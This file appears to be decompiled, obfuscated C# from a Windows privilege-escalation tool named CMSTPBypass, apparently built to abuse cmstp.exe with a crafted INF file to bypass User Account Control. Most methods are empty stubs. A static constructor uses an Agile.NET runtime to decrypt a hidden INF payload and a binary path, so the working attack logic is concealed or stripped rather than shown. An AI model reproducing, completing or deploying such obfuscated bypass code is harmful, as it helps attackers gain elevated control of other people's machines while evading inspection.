using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
	public static string InfData;

	public static string BinaryPath;

	[DllImport("user32.dll")]
	[MethodImpl(MethodImplOptions.NoInlining)]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	[MethodImpl(MethodImplOptions.NoInlining)]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string SetInfFile(string CommandToExecute)
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Main()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static IntPtr SetWindowActive(string ProcessName)
	{
		return default(IntPtr);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static byte[] a(string file)
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public CMSTPBypass()
	{
	}

	static CMSTPBypass()
	{
		_003CAgileDotNetRT_003E.Initialize();
		_003CAgileDotNetRT_003E.PostInitialize();
		InfData = _003CAgileDotNetRT_003E.a("ù®\u0017¹ï\u009bAÊ\u008cÔ+ØÑß3õ\u001b½4\u0004\u0015a\u0094KÞuÙ\u0092þí·&Õc¡©Ï%\u008aW\u001e\u0081\u0013+\u001b\u0001ûÌ¿\ay£c#\u0099Ö\u00b4#zéX\\\u0095ã¤C}Ç\u008eë\u0091I\u007fC\u0089\u001d\u0081\u0082\u009bÞO\u001bB\u0002»Gb:g[ª?@O·M\u0090Ct\u0098\u0092|Î\u00b4'\u00b8ù\u0080]®\u0083«\u0016áÄÔ\u0001ä\u001aº!z^o\u0091CÓpÍÀ\u0088\u0092\u0098\u0012Ñg\u009c\u00afÞ4³Z7ÑLd@o\u0082Ä\u009e\u0001k«y!ç\u0095\u0081\u0002{ædB\u00adº\u0082B{Ã¢é\u00b8AmY\u0084\0³\u0093\u0091ÅHIo*Â\b\v\u0017{B\u0083;]_\u0097\b»Ro\u0092ÜJË\u00b4\u001eëþ\u0097\u000eÖ¤°XóÓ×=ó\vï\u0002\\Ew\u008c\u0002ÿqÙ\u0094\u00b4\u0094Ö6Ì\"¦¤Ù5¢u4¶s@~G°Ô¾=\\\u008d[\u0002¬Ñ\u009e\u000fBÁzuÂ\u009d\u0086EeØ\u0088ê¹\f#~\u00adS\u0083\u009b\u0081ÅQ\bd\u000f\u00ad\u0013\u0004\u0012\u001e%µ\u0019FH\u0090a\u009dDi³\u0099NÖ\u008b\u0017\u00a8è\u009bAÊ\u0090²\u0014äÅÔ ò3Åe\0\u00012Ì\u000e\u0089-\u008eÍëÚ·.ÏW\u009c\u00afØ\u001e\u008f]\u0011ør`M\u007f\u0098ø\u0095N?õ\u001cE¶Þ¶<[ÛQB\u0097¥£\u007fJà\u0084å¡EcY½yÂ¾¹ýl\u0004-Wê`d\u0012@x\u00af\bvg©A\u0090Er\u0084\u0093[Ö\u0084%¢ò\u0096AÓ¢\u0082;ÄÄÃ7ï\u001a\u00994KBk\u0093LáUÎ\u008dú·\u00976Ëq\u0093\u0089ç\f\u0084Kk\u008e\u000f@vNÓ»Û@O°y)\u0084ó¿\u0019`û@Q¤\u0085·WzÛÃªõ\u000e)b\u008e\u0016\u0098\u0086\u0097ÒUCe2ºAD&1\rÂz\u0011\u0019î\"\u00a8di\u0085\u0095SÅ«/ÁÏ\u0097\\Ò\u00b8½\u001dÿ×Ü7¼L\u0081(X_A\u009dV\u009f\u001eí\u0095µ\u0095\u0082\u0011Õa\u0081«Ç$þ;\u0016Å@kmj\u0085µñh");
		BinaryPath = _003CAgileDotNetRT_003E.a("Áâ.¼õ\u009cJË¦\u00ad$ÂÏÂ&ä\u0003üceRo\u008fVÍ:Û\u0085¿");
	}
}
